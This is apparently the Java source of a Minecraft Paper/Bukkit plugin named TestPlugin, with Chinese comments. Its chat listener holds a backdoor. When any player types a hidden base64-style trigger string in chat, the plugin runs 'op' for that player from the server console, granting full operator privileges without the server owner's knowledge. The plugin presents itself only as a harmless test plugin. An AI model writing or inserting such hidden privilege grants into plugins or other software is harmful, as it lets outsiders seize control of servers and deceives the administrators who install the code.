package io.papermc.testplugin;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class TestPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // 当插件启用时执行这里的代码
        getLogger().info("TEST PLUGIN IS ENABLE");
        
        // 注册事件监听器
        this.getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerChat(PlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        
        // 检查消息是否包含特殊字符串
        if (message.contains("@dGhlX2Z1Y2tpbmdfb3Ah")) {
            // 给玩家 op 权限
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + player.getName());
            
            player.sendMessage("现在您拥有了op权限.");
        }
    }
}
